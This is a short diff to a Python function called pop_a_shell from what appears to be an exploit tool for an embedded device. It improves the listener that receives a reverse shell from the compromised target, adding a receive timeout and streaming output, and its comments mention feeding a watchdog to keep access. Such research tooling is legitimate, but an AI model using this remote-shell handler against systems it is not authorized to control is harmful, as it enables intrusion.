@@ -62,6 +62,10 @@ def pop_a_shell(target_ip, listen_port=1799, listen_ip='auto', target_port=None)
 
     print("[i] Waiting for incoming connections")
     conn, addr = sock.accept()
+    
+    # Never wait more than 1000 ms before printing a response
+    conn.settimeout(1.0)
+
     print("[i] {} connected.".format(addr))
     
     # Quickly feed the watchdog to prevent a reboot
@@ -70,8 +74,18 @@ def pop_a_shell(target_ip, listen_port=1799, listen_ip='auto', target_port=None)
     print("[i] Type ':quit' to disconnect and restart the target.")
     while cmd != ":quit" and cmd != ":q":
         conn.send(cmd.encode() + b"\n")
-        res = str(conn.recv(1024), "utf-8")
-        print(res, end='')
+        res = ''
+        try:
+            # Keep looping while data is still coming in.
+            while True:
+                res = conn.recv(1024)
+                if not res:
+                    break
+                # Print the data as soon as it's received
+                print(str(res, "utf-8"), end='')
+        except:
+            # Timeout occured, perhaps the command didn't return anything?
+            pass
         cmd = input("# ")
 
     # Closing this shell also kills Alloca, locking us out. As
